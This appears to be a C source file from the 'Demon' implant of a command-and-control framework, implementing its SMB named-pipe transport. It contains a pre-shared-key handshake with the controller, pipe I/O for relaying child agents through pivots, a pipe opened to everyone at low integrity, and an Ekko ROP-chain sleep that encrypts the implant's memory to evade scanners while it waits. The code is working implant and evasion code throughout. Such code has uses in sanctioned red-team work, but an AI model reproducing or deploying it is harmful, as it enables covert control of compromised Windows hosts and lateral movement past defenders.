#include <Demon.h>
#include <core/TransportSmb.h>
#include <core/MiniStd.h>
#include <core/TransportKex.h>
#include <core/CryptoKex.h>
#include <crypt/AesCrypt.h>
#include <core/SleepObf.h>

#ifdef TRANSPORT_SMB

#define KEX_TRANSCRIPT_MAX (KEX_PUB_LEN*2 + KEX_NONCE_LEN*2)

// Write 32-bit big-endian (server ParseHeader expects BE)
static VOID WriteBE32(BYTE* buf, UINT32 val) {
    buf[0] = (val >> 24) & 0xFF;
    buf[1] = (val >> 16) & 0xFF;
    buf[2] = (val >> 8)  & 0xFF;
    buf[3] = (val)       & 0xFF;
}

// Perform SMB key exchange handshake over the pipe, keeping outer framing intact.
BOOL SmbKex( VOID )
{
    BOOL    Success   = FALSE;
    KEX_AGENT_HELLO   Hello  = { 0 };
    KEX_SERVER_HELLO  Server = { 0 };
    KEX_DERIVED_KEYS  Keys   = { 0 };
    BYTE    ephPriv[KEX_PRIV_LEN] = { 0 };

    BUFFER SendBuf = { 0 };
    BUFFER RespBuf = { 0 };

    // Require PSK present
    if (!Instance->Config.PskCfg.Psk || Instance->Config.PskCfg.PskLen < KEX_KEY_LEN) {
        PUTS_DONT_SEND("PSK missing or too small (SMB)");
        return FALSE;
    }

    if (!KexAgentBuildHello(Instance->Config.PskCfg.Psk, &Hello, ephPriv))
        goto cleanup;

    // First packet framed with header [Size][Magic][AgentID][AgentHello]
    SIZE_T frameSize = sizeof(UINT32)*3 + sizeof(Hello);
    PBYTE frame = Instance->Win32.LocalAlloc(LPTR, frameSize);
    WriteBE32(frame, (UINT32)frameSize);
    WriteBE32(frame + 4, DEMON_MAGIC_VALUE);
    WriteBE32(frame + 8, Instance->Session.AgentID);
    MemCopy(frame + 12, &Hello, sizeof(Hello));

    SendBuf.Buffer = frame;
    SendBuf.Length = frameSize;
    if (!SmbSend(&SendBuf))
        goto cleanup;

    // Read ServerHello — block forever (0 = no timeout) since KEX MUST complete
    if (!SmbRecv(&RespBuf, 0))
        goto cleanup;

    if (RespBuf.Length < sizeof(Server))
        goto cleanup;

    MemCopy(&Server, RespBuf.Buffer, sizeof(Server));

    if (!KexAgentProcessServerHello(
            Instance->Config.PskCfg.Psk,
            ephPriv,
            &Hello,
            &Server,
            &Keys))
        goto cleanup;

    // Stash keys into Instance config
    if (!Instance->Config.AES.Key)
        Instance->Config.AES.Key = Instance->Win32.LocalAlloc(LPTR, KEX_KEY_LEN);
    if (!Instance->Config.AES.IV)
        Instance->Config.AES.IV = Instance->Win32.LocalAlloc(LPTR, KEX_NONCE_LEN);
    if (!Instance->Config.AES.MacKey)
        Instance->Config.AES.MacKey = Instance->Win32.LocalAlloc(LPTR, KEX_KEY_LEN);

    MemCopy(Instance->Config.AES.Key,    Keys.AesKey, KEX_KEY_LEN);
    MemCopy(Instance->Config.AES.IV,     Keys.AesIv,  KEX_NONCE_LEN);
    MemCopy(Instance->Config.AES.MacKey, Keys.MacKey, KEX_KEY_LEN);

    Instance->Session.Connected = TRUE;
    Success = TRUE;

cleanup:
    if (RespBuf.Buffer)
        Instance->Win32.LocalFree(RespBuf.Buffer);
    if (frame)
        Instance->Win32.LocalFree(frame);
    RtlSecureZeroMemory(&Keys, sizeof(Keys));
    RtlSecureZeroMemory(&Hello, sizeof(Hello));
    RtlSecureZeroMemory(&Server, sizeof(Server));
    RtlSecureZeroMemory(ephPriv, sizeof(ephPriv));
    return Success;
}

/*
 * Overlapped I/O helpers for the SMB agent's own pipe.
 * These wrap ReadFile/WriteFile with OVERLAPPED for synchronous-style behavior
 * on a FILE_FLAG_OVERLAPPED handle. Pivot child pipes (in Command.c) are
 * synchronous and continue using the original PipeRead/PipeWrite.
 */

static BOOL SmbPipeReadOvl(
    IN  HANDLE Handle,
    OUT PVOID  Buffer,
    IN  DWORD  Size,
    OUT PDWORD BytesRead
) {
    OVERLAPPED      Ov      = { 0 };
    HANDLE          hEvent  = NULL;

    if ( ! NT_SUCCESS( SysNtCreateEvent( &hEvent, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) )
        return FALSE;

    Ov.hEvent = hEvent;
    *BytesRead = 0;

    if ( ! Instance->Win32.ReadFile( Handle, Buffer, Size, BytesRead, &Ov ) )
    {
        DWORD Err = NtGetLastError();
        if ( Err == ERROR_IO_PENDING )
        {
            /* Wait for I/O completion */
            SysNtWaitForSingleObject( hEvent, FALSE, NULL );
            *BytesRead = (DWORD)Ov.InternalHigh;
        }
        else if ( Err != ERROR_MORE_DATA )
        {
            SysNtClose( hEvent );
            return FALSE;
        }
        else
        {
            /* ERROR_MORE_DATA — partial read, bytes available */
            *BytesRead = (DWORD)Ov.InternalHigh;
        }
    }

    SysNtClose( hEvent );
    return TRUE;
}

static BOOL SmbPipeWriteOvl(
    IN HANDLE Handle,
    IN PVOID  Buffer,
    IN DWORD  Size
) {
    OVERLAPPED      Ov      = { 0 };
    HANDLE          hEvent  = NULL;
    DWORD           Written = 0;

    if ( ! NT_SUCCESS( SysNtCreateEvent( &hEvent, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) )
        return FALSE;

    Ov.hEvent = hEvent;

    if ( ! Instance->Win32.WriteFile( Handle, Buffer, Size, &Written, &Ov ) )
    {
        if ( NtGetLastError() == ERROR_IO_PENDING )
        {
            SysNtWaitForSingleObject( hEvent, FALSE, NULL );
            Written = (DWORD)Ov.InternalHigh;
        }
        else
        {
            SysNtClose( hEvent );
            return FALSE;
        }
    }

    SysNtClose( hEvent );
    return ( Written == Size );
}

/* Chunked overlapped write — handles messages larger than PIPE_BUFFER_MAX */
static BOOL SmbPipeWrite( HANDLE Handle, PBUFFER Buffer )
{
    DWORD Total = 0;

    do {
        DWORD Chunk = MIN( ( Buffer->Length - Total ), PIPE_BUFFER_MAX );
        if ( ! SmbPipeWriteOvl( Handle, Buffer->Buffer + Total, Chunk ) )
            return FALSE;
        Total += Chunk;
    } while ( Total < Buffer->Length );

    return TRUE;
}

/* Chunked overlapped read — handles messages larger than PIPE_BUFFER_MAX */
static BOOL SmbPipeRead( HANDLE Handle, PBUFFER Buffer )
{
    DWORD Total = 0;

    do {
        DWORD ToRead = MIN( ( Buffer->Length - Total ), PIPE_BUFFER_MAX );
        DWORD Read   = 0;
        if ( ! SmbPipeReadOvl( Handle, C_PTR( U_PTR( Buffer->Buffer ) + Total ), ToRead, &Read ) )
            return FALSE;
        Total += Read;
    } while ( Total < Buffer->Length );

    return TRUE;
}

BOOL SmbSend( PBUFFER Send )
{
    if ( ! Instance->Config.Transport.Handle )
    {
        SMB_PIPE_SEC_ATTR   SmbSecAttr   = { 0 };
        SECURITY_ATTRIBUTES SecurityAttr = { 0 };
        OVERLAPPED          OvConnect    = { 0 };
        HANDLE              hConnEvt     = NULL;

        /* Setup attributes to allow "anyone" to connect to our pipe */
        SmbSecurityAttrOpen( &SmbSecAttr, &SecurityAttr );

        /* Create pipe with FILE_FLAG_OVERLAPPED for event-driven encrypted sleep.
         * This allows SmbRecv to issue async ReadFile and wait on the I/O completion
         * event inside an Ekko ROP chain — giving 100% memory encryption during idle. */
        Instance->Config.Transport.Handle = Instance->Win32.CreateNamedPipeW( Instance->Config.Transport.Name,
                                                                            PIPE_ACCESS_DUPLEX |
                                                                            FILE_FLAG_OVERLAPPED,            // async I/O
                                                                            PIPE_TYPE_MESSAGE     |
                                                                            PIPE_READMODE_MESSAGE |
                                                                            PIPE_WAIT,
                                                                            PIPE_UNLIMITED_INSTANCES,
                                                                            PIPE_BUFFER_MAX,
                                                                            PIPE_BUFFER_MAX,
                                                                            0,
                                                                            &SecurityAttr );

        SmbSecurityAttrFree( &SmbSecAttr );

        if ( ! Instance->Config.Transport.Handle )
            return FALSE;

        /* ConnectNamedPipe on an overlapped handle:
         * - ERROR_IO_PENDING: no client yet, wait for connection
         * - ERROR_PIPE_CONNECTED: client already connected (race), success
         * - TRUE: client just connected */
        if ( NT_SUCCESS( SysNtCreateEvent( &hConnEvt, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) )
        {
            OvConnect.hEvent = hConnEvt;

            if ( ! Instance->Win32.ConnectNamedPipe( Instance->Config.Transport.Handle, &OvConnect ) )
            {
                DWORD Err = NtGetLastError();
                if ( Err == ERROR_IO_PENDING )
                {
                    /* Wait for parent to connect */
                    SysNtWaitForSingleObject( hConnEvt, FALSE, NULL );
                }
                else if ( Err != ERROR_PIPE_CONNECTED )
                {
                    /* Real error */
                    SysNtClose( hConnEvt );
                    SysNtClose( Instance->Config.Transport.Handle );
                    Instance->Config.Transport.Handle = NULL;
                    return FALSE;
                }
                /* ERROR_PIPE_CONNECTED is fine — client already connected */
            }
            SysNtClose( hConnEvt );
        }
        else
        {
            SysNtClose( Instance->Config.Transport.Handle );
            Instance->Config.Transport.Handle = NULL;
            return FALSE;
        }

        return SmbPipeWrite( Instance->Config.Transport.Handle, Send );
    }

    if ( ! SmbPipeWrite( Instance->Config.Transport.Handle, Send ) )
    {
        PRINTF( "WriteFile Failed:[%d]\n", NtGetLastError() );

        if ( NtGetLastError() == ERROR_NO_DATA )
        {
            if ( Instance->Config.Transport.Handle )
            {
                SysNtClose( Instance->Config.Transport.Handle );
                Instance->Config.Transport.Handle = NULL;
            }

            Instance->Session.Connected = FALSE;
            return FALSE;
        }
    }

    return TRUE;
}

BOOL SmbRecv( PBUFFER Resp, DWORD TimeoutMs )
{
    UINT32      DemonId     = 0;
    UINT32      PackageSize = 0;
    DWORD       BytesRead   = 0;
    OVERLAPPED  Ov          = { 0 };
    HANDLE      hEvent      = NULL;
    BOOL        Success     = FALSE;

    Resp->Buffer = NULL;
    Resp->Length = 0;

    /*
     * EVENT-DRIVEN ENCRYPTED SLEEP (overlapped I/O):
     *
     * TimeoutMs == 0  → KEX mode: fast polling with Sleep(100), no encryption
     * TimeoutMs > 0   → Normal operation: issue async ReadFile for DemonId,
     *                    encrypt memory, wait on I/O event. Wake instantly on
     *                    data or on timeout for PivotPush relay cycle.
     *
     * MEMORY PROTECTION: The agent encrypts its entire image via the Ekko ROP
     * chain and waits on the overlapped I/O completion event. The agent is only
     * decrypted when data actually arrives or the timeout expires. Zero API calls
     * during the encrypted wait — no PeekNamedPipe polling.
     */

    if ( TimeoutMs == 0 )
    {
        /* KEX mode: fast polling, no memory encryption.
         * Keys aren't established yet, and KEX must complete fast.
         * Use PeekNamedPipe polling with short sleep. */
        DWORD BytesAvail = 0;
        DWORD Elapsed    = 0;

        for ( ;; )
        {
            if ( ! Instance->Win32.PeekNamedPipe( Instance->Config.Transport.Handle, NULL, 0, NULL, &BytesAvail, NULL ) )
            {
                PRINTF( "PeekNamedPipe failed with %d\n", NtGetLastError() )
                Instance->Session.Connected = FALSE;
                return FALSE;
            }

            if ( BytesAvail > sizeof( UINT32 ) + sizeof( UINT32 ) )
                break;

            Instance->Win32.Sleep( 100 );
            Elapsed += 100;
        }

        /* Data available — read DemonId synchronously via overlapped wrapper */
        if ( ! SmbPipeReadOvl( Instance->Config.Transport.Handle, &DemonId, sizeof( UINT32 ), &BytesRead ) )
        {
            Instance->Session.Connected = FALSE;
            return FALSE;
        }

        goto READ_PAYLOAD;
    }

    /* Normal operation: overlapped ReadFile + encrypted sleep */

    if ( ! NT_SUCCESS( SysNtCreateEvent( &hEvent, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) )
        return FALSE;

    PRINTF( "SmbRecv: event=%p pipe=%p timeout=%lu\n", hEvent, Instance->Config.Transport.Handle, TimeoutMs )

    Ov.hEvent = hEvent;

    /* Issue async ReadFile for the DemonId (first 4 bytes of message).
     * If data is already available, this completes immediately.
     * If not, returns ERROR_IO_PENDING and signals hEvent on completion.
     * The DemonId variable is on the stack — outside the agent image,
     * so it survives memory encryption. The kernel writes to it directly. */
    PUTS( "SmbRecv: calling ReadFile (overlapped)..." )
    if ( ! Instance->Win32.ReadFile( Instance->Config.Transport.Handle, &DemonId, sizeof( UINT32 ), &BytesRead, &Ov ) )
    {
        DWORD Err = NtGetLastError();
        PRINTF( "SmbRecv: ReadFile returned FALSE, err=%lu\n", Err )

        if ( Err == ERROR_IO_PENDING )
        {
            /* No data yet — encrypt memory and wait on the I/O event.
             * SleepObfEx encrypts the agent image via Ekko ROP chain
             * and waits on hEvent. The agent wakes when:
             *   - Parent writes data (I/O completes, event signals)
             *   - Timeout expires (for PivotPush relay cycle) */
            PUTS( "SmbRecv: IO_PENDING, entering SleepObfEx" )
            SleepObfEx( hEvent, TimeoutMs );
            PUTS( "SmbRecv: woke from SleepObfEx" )

            /* Check if I/O completed or we timed out.
             * OVERLAPPED.Internal holds the I/O status:
             *   STATUS_PENDING (0x103) = still waiting (timeout fired)
             *   Other value = I/O completed */
            PRINTF( "SmbRecv: Ov.Internal=%lx Ov.InternalHigh=%lu\n", (ULONG)(ULONG_PTR)Ov.Internal, (ULONG)(ULONG_PTR)Ov.InternalHigh )
            if ( (NTSTATUS)Ov.Internal == (NTSTATUS)0x103 /* STATUS_PENDING */ )
            {
                /* Timeout — no data arrived. Cancel the pending I/O
                 * to prevent the kernel from writing to our stack buffer
                 * after we return. */
                IO_STATUS_BLOCK IoSb = { 0 };
                Instance->Win32.NtCancelIoFile( Instance->Config.Transport.Handle, &IoSb );
                /* Wait for cancellation to take effect */
                SysNtWaitForSingleObject( hEvent, FALSE, NULL );

                SysNtClose( hEvent );

                /* Return success with empty buffer — lets CommandDispatcher
                 * run PivotPush to relay children's data upstream. */
                return TRUE;
            }

            /* I/O completed — DemonId has been read.
             * Check for errors in the I/O status. */
            if ( ! NT_SUCCESS( (NTSTATUS)Ov.Internal ) && (NTSTATUS)Ov.Internal != (NTSTATUS)0x80000005 /* STATUS_BUFFER_OVERFLOW */ )
            {
                PRINTF( "Overlapped ReadFile failed with status: %lx\n", (NTSTATUS)Ov.Internal )
                SysNtClose( hEvent );
                Instance->Session.Connected = FALSE;
                return FALSE;
            }

            BytesRead = (DWORD)Ov.InternalHigh;
        }
        else if ( Err == ERROR_MORE_DATA )
        {
            /* Data was immediately available, message larger than 4 bytes (normal) */
            BytesRead = (DWORD)Ov.InternalHigh;
        }
        else
        {
            /* Pipe broken or other error */
            PRINTF( "ReadFile failed with %d\n", Err )
            SysNtClose( hEvent );
            Instance->Session.Connected = FALSE;
            return FALSE;
        }
    }
    else
    {
        /* ReadFile completed immediately — data was already available */
        PRINTF( "SmbRecv: ReadFile completed immediately, bytes=%lu\n", (DWORD)Ov.InternalHigh )
        BytesRead = (DWORD)Ov.InternalHigh;
    }

    SysNtClose( hEvent );
    hEvent = NULL;

READ_PAYLOAD:

    if ( Instance->Session.AgentID != DemonId )
    {
        PRINTF( "The message doesn't have the correct DemonId: %x\n", DemonId )
        Instance->Session.Connected = FALSE;
        return FALSE;
    }

    /* Read PackageSize (next 4 bytes of the same message) */
    if ( ! SmbPipeReadOvl( Instance->Config.Transport.Handle, &PackageSize, sizeof( UINT32 ), &BytesRead ) )
    {
        PUTS( "Failed to read PackageSize from pipe" )
        Instance->Session.Connected = FALSE;
        return FALSE;
    }

    /* Read the payload */
    Resp->Buffer = Instance->Win32.LocalAlloc( LPTR, PackageSize );
    Resp->Length = PackageSize;

    if ( ! Resp->Buffer )
        return FALSE;

    if ( ! SmbPipeRead( Instance->Config.Transport.Handle, Resp ) )
    {
        PRINTF( "SmbPipeRead failed to read 0x%x bytes\n", Resp->Length )
        Instance->Win32.LocalFree( Resp->Buffer );
        Resp->Buffer = NULL;
        Resp->Length = 0;
        Instance->Session.Connected = FALSE;
        return FALSE;
    }

    return TRUE;
}

/* Took it from https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/metsrv/server_pivot_named_pipe.c#L286
 * But seems like MeterPreter doesn't free everything so let's do this too. */
VOID SmbSecurityAttrOpen( PSMB_PIPE_SEC_ATTR SmbSecAttr, PSECURITY_ATTRIBUTES SecurityAttr )
{
    SID_IDENTIFIER_AUTHORITY SidIdAuth      = SECURITY_WORLD_SID_AUTHORITY;
    SID_IDENTIFIER_AUTHORITY SidLabel       = SECURITY_MANDATORY_LABEL_AUTHORITY;
    EXPLICIT_ACCESSW         ExplicitAccess = { 0 };
    DWORD                    Result         = 0;
    PACL                     DAcl           = NULL;
    /* zero them out. */
    MemSet( SmbSecAttr,   0, sizeof( SMB_PIPE_SEC_ATTR ) );
    MemSet( SecurityAttr, 0, sizeof( PSECURITY_ATTRIBUTES ) );

    if ( ! Instance->Win32.AllocateAndInitializeSid( &SidIdAuth, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &SmbSecAttr->Sid ) )
    {
        PRINTF( "AllocateAndInitializeSid failed: %u\n", NtGetLastError() );
        return;
    }
    PRINTF( "SmbSecAttr->Sid: %p\n", SmbSecAttr->Sid );

    ExplicitAccess.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;
    ExplicitAccess.grfAccessMode        = SET_ACCESS;
    ExplicitAccess.grfInheritance       = NO_INHERITANCE;
    ExplicitAccess.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
    ExplicitAccess.Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ExplicitAccess.Trustee.ptstrName    = SmbSecAttr->Sid;

    Result = Instance->Win32.SetEntriesInAclW( 1, &ExplicitAccess, NULL, &DAcl );
    if ( Result != ERROR_SUCCESS )
    {
        PRINTF( "SetEntriesInAclW failed: %u\n", Result );
    }
    PRINTF( "DACL: %p\n", DAcl );

    if ( ! Instance->Win32.AllocateAndInitializeSid( &SidLabel, 1, SECURITY_MANDATORY_LOW_RID, 0, 0, 0, 0, 0, 0, 0, &SmbSecAttr->SidLow ) )
    {
        PRINTF( "AllocateAndInitializeSid failed: %u\n", NtGetLastError() );
    }
    PRINTF( "sidLow: %p\n", SmbSecAttr->SidLow );

    SmbSecAttr->SAcl = MmHeapAlloc( MAX_PATH );
    if ( ! Instance->Win32.InitializeAcl( SmbSecAttr->SAcl, MAX_PATH, ACL_REVISION_DS ) )
    {
        PRINTF( "InitializeAcl failed: %u\n", NtGetLastError() );
    }

    if ( ! Instance->Win32.AddMandatoryAce( SmbSecAttr->SAcl, ACL_REVISION_DS, NO_PROPAGATE_INHERIT_ACE, 0, SmbSecAttr->SidLow ) )
    {
        PRINTF( "AddMandatoryAce failed: %u\n", NtGetLastError() );
    }

    // now build the descriptor
    SmbSecAttr->SecDec = MmHeapAlloc( SECURITY_DESCRIPTOR_MIN_LENGTH );
    if ( ! Instance->Win32.InitializeSecurityDescriptor( SmbSecAttr->SecDec, SECURITY_DESCRIPTOR_REVISION ) )
    {
        PRINTF( "InitializeSecurityDescriptor failed: %u\n", NtGetLastError() );
    }

    if ( ! Instance->Win32.SetSecurityDescriptorDacl( SmbSecAttr->SecDec, TRUE, DAcl, FALSE ) )
    {
        PRINTF( "SetSecurityDescriptorDacl failed: %u\n", NtGetLastError() );
    }

    if ( ! Instance->Win32.SetSecurityDescriptorSacl( SmbSecAttr->SecDec, TRUE, SmbSecAttr->SAcl, FALSE ) )
    {
        PRINTF( "SetSecurityDescriptorSacl failed: %u\n", NtGetLastError() );
    }

    SecurityAttr->lpSecurityDescriptor = SmbSecAttr->SecDec;
    SecurityAttr->bInheritHandle       = FALSE;
    SecurityAttr->nLength              = sizeof( SECURITY_ATTRIBUTES );
}

VOID SmbSecurityAttrFree( PSMB_PIPE_SEC_ATTR SmbSecAttr )
{
    if ( SmbSecAttr->Sid )
    {
        Instance->Win32.FreeSid( SmbSecAttr->Sid );
        SmbSecAttr->Sid = NULL;
    }

    if ( SmbSecAttr->SidLow )
    {
        Instance->Win32.FreeSid( SmbSecAttr->SidLow );
        SmbSecAttr->SidLow = NULL;
    }

    if ( SmbSecAttr->SAcl )
    {
        MmHeapFree( SmbSecAttr->SAcl );
        SmbSecAttr->SAcl = NULL;
    }

    if ( SmbSecAttr->SecDec )
    {
        MmHeapFree( SmbSecAttr->SecDec );
        SmbSecAttr->SecDec = NULL;
    }
}

#endif